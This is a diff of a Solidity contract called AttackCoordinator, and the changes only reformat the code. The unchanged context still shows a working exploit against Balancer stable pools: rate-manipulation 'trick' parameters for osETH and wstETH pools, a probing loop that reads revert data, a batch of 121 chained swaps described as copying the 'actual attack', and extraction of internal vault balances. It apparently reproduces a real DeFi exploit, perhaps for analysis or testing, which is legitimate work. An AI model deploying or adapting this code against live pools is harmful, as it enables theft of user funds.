@@ -26,9 +26,9 @@ contract AttackCoordinator {
     struct Pool1Params {
         bytes32 poolId;
         uint256 bptIndex;
-        uint256 trickIndex;      // 2 (osETH)
-        uint256 trickRate;       // 1.058e18
-        uint256 trickAmt;        // 17
+        uint256 trickIndex; // 2 (osETH)
+        uint256 trickRate; // 1.058e18
+        uint256 trickAmt; // 17
         uint256 startingRate;
     }
 
@@ -36,8 +36,8 @@ contract AttackCoordinator {
     struct Pool2Params {
         bytes32 poolId;
         uint256 bptIndex;
-        uint256 trickIndex;      // 0 (wstETH)
-        uint256 trickAmt;        // 4
+        uint256 trickIndex; // 0 (wstETH)
+        uint256 trickAmt; // 4
         uint256 startingRate;
     }
 
@@ -54,11 +54,7 @@ contract AttackCoordinator {
         _;
     }
 
-    constructor(
-        address _vault,
-        address _pool1,
-        address _pool2
-    ) {
+    constructor(address _vault, address _pool1, address _pool2) {
         vault = IBalancerVault(_vault);
         pool1 = _pool1;
         pool2 = _pool2;
@@ -103,8 +99,7 @@ contract AttackCoordinator {
         emit LogNamedUint("bptIndex", p1.bptIndex);
 
         // Step 2: Get pool tokens
-        (address[] memory tokens, uint256[] memory balances,) =
-            vault.getPoolTokens(p1.poolId);
+        (address[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(p1.poolId);
 
         // Step 3: Approve all tokens
         for (uint256 i = 0; i < tokens.length; i++) {
@@ -135,7 +130,7 @@ contract AttackCoordinator {
         emit LogNamedUint("trickIndex", p1.trickIndex);
         emit LogNamedUint("trickRate", p1.trickRate);
 
-        (uint256 ampValue, , uint256 ampPrecision) = pool.getAmplificationParameter();
+        (uint256 ampValue,, uint256 ampPrecision) = pool.getAmplificationParameter();
         emit LogNamedUint("nonTrickIndex", 0);
         emit LogNamedUint("currentAmp", ampValue);
 
@@ -163,7 +158,7 @@ contract AttackCoordinator {
 
         // Step 11: Verify manipulation
         emit LogString("Ending Invariant");
-        (,uint256[] memory endBalances,) = vault.getPoolTokens(p1.poolId);
+        (, uint256[] memory endBalances,) = vault.getPoolTokens(p1.poolId);
         for (uint256 i = 0; i < endBalances.length; i++) {
             emit LogNamedUint("end_balances[i]", endBalances[i]);
         }
@@ -189,8 +184,7 @@ contract AttackCoordinator {
         p2.poolId = pool.getPoolId();
         p2.bptIndex = pool.getBptIndex();
 
-        (address[] memory tokens, uint256[] memory balances,) =
-            vault.getPoolTokens(p2.poolId);
+        (address[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(p2.poolId);
 
         // Approve tokens
         for (uint256 i = 0; i < tokens.length; i++) {
@@ -232,7 +226,7 @@ contract AttackCoordinator {
 
         // Verify manipulation
         emit LogString("Ending Invariant");
-        (,uint256[] memory endBalances,) = vault.getPoolTokens(p2.poolId);
+        (, uint256[] memory endBalances,) = vault.getPoolTokens(p2.poolId);
         for (uint256 i = 0; i < endBalances.length; i++) {
             emit LogNamedUint("end_balances[i]", endBalances[i]);
         }
@@ -255,12 +249,9 @@ contract AttackCoordinator {
      *      Some calls will revert (BAL#004), others succeed with return data
      *      We read the return data to determine when conditions are met
      */
-    function executeManipulationLoop(
-        address pool,
-        uint256 trickIndex,
-        uint256 trickAmt,
-        uint256 iterations
-    ) internal {
+    function executeManipulationLoop(address pool, uint256 trickIndex, uint256 trickAmt, uint256 iterations)
+        internal
+    {
         uint256 successCount = 0;
         uint256 revertCount = 0;
         uint256 bestScore = 0;
@@ -315,11 +306,7 @@ contract AttackCoordinator {
      * @dev Uses GIVEN_IN mode with 121 chained swaps as in the actual attack
      *      Pattern varies token indices: 1→0, 1→2, 2→0, 0→2, etc.
      */
-    function executeBatchSwap(
-        address pool,
-        address[] memory tokens,
-        uint256[] memory balances
-    ) internal {
+    function executeBatchSwap(address pool, address[] memory tokens, uint256[] memory balances) internal {
         bytes32 poolId = IBalancerPool(pool).getPoolId();
 
         // Find the BPT index (the pool token itself)
@@ -333,8 +320,7 @@ contract AttackCoordinator {
         // From calldata analysis: each poolId occurrence = one swap
         // Patterns observed: 1→0, 1→2, 2→0, 0→2, 2→1, 0→1, etc.
         uint256 numSwaps = 121; // Exact number from actual attack
-        IBalancerVault.BatchSwapStep[] memory swaps =
-            new IBalancerVault.BatchSwapStep[](numSwaps);
+        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](numSwaps);
 
         emit LogNamedUint("Creating batch with swaps", numSwaps);
 
@@ -423,7 +409,9 @@ contract AttackCoordinator {
             funds,
             limits,
             block.timestamp + 3600 // 1 hour deadline
-        ) returns (int256[] memory assetDeltas) {
+        ) returns (
+            int256[] memory assetDeltas
+        ) {
             emit LogString("Batch swap successful!");
             emit LogString("Asset deltas from extraction:");
             for (uint256 i = 0; i < assetDeltas.length; i++) {
@@ -459,10 +447,7 @@ contract AttackCoordinator {
         emit LogString("Pool A: osETH/WETH-BPT Extraction");
 
         // Check and log internal balances for Pool 1 tokens
-        uint256[] memory internalBalancesPool1 = vault.getInternalBalance(
-            address(this),
-            tokensPool1
-        );
+        uint256[] memory internalBalancesPool1 = vault.getInternalBalance(address(this), tokensPool1);
 
         emit LogNamedUint("Internal WETH balance", internalBalancesPool1[0]);
         emit LogNamedUint("Internal osETH/WETH-BPT balance", internalBalancesPool1[p1.bptIndex]);
@@ -502,10 +487,7 @@ contract AttackCoordinator {
         emit LogString("Pool B: wstETH/WETH-BPT Extraction");
 
         // Check internal balances for Pool 2 tokens
-        uint256[] memory internalBalancesPool2 = vault.getInternalBalance(
-            address(this),
-            tokensPool2
-        );
+        uint256[] memory internalBalancesPool2 = vault.getInternalBalance(address(this), tokensPool2);
 
         emit LogNamedUint("Internal wstETH balance", internalBalancesPool2[0]);
         emit LogNamedUint("Internal wstETH-WETH-BPT balance", internalBalancesPool2[p2.bptIndex]);
